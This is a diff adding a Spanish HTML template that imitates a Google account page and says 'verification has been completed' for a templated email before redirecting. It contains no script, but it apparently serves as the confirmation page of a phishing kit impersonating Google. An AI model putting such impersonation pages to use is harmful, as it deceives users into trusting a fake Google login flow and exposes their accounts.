@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Redirigiendo - Cuenta de Google</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif;}
+        body{background:#f8f9fa;color:#202124;min-height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px;}
+        .container{max-width:500px;}
+        .success-icon{font-size:72px;color:#34a853;margin-bottom:20px;}
+        .message h2{margin-bottom:16px;color:#202124;}
+        .message p{color:#5f6368;line-height:1.5;margin-bottom:20px;}
+        .redirect{color:#1a73e8;text-decoration:none;font-weight:500;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="success-icon">✓</div>
+        <div class="message">
+            <h2>Redirigiendo...</h2>
+            <p>La verificación se ha completado para <strong>{{ email }}</strong>.</p>
+            <p>Serás redirigido a los servicios de Google.</p>
+            <p><a href="/" class="redirect">Volver a la página de inicio</a></p>
+        </div>
+    </div>
+</body>
+</html>
